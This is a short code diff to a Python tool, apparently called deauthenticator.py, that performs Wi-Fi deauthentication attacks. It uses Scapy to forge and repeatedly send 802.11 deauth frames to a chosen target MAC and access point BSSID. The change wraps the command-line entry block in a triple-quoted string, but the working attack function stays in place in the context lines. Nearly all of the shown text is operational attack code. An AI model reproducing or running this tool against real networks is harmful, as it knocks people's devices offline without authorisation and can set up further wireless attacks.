@@ -16,6 +16,8 @@ def deauth(iface: str, count: int, bssid: str, target_mac: str):
     dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
     frame = RadioTap()/dot11/Dot11Deauth()
     sendp(frame, iface=iface, count=count, inter=0.100)
+
+'''
 if __name__ == "__main__":
     parser = AP(description="Perform Deauthentication attack against a computer")
     parser.add_argument("-i", "--interface",help="interface to send deauth packets from")
@@ -28,4 +30,4 @@ if __name__ == "__main__":
         print("[-] Please specify all program arguments... run `sudo python3 deauthenticator.py -h` for help")
         exit(1)
     deauth(args.interface, int(args.count), args.bssid, args.target_mac)
-
+'''
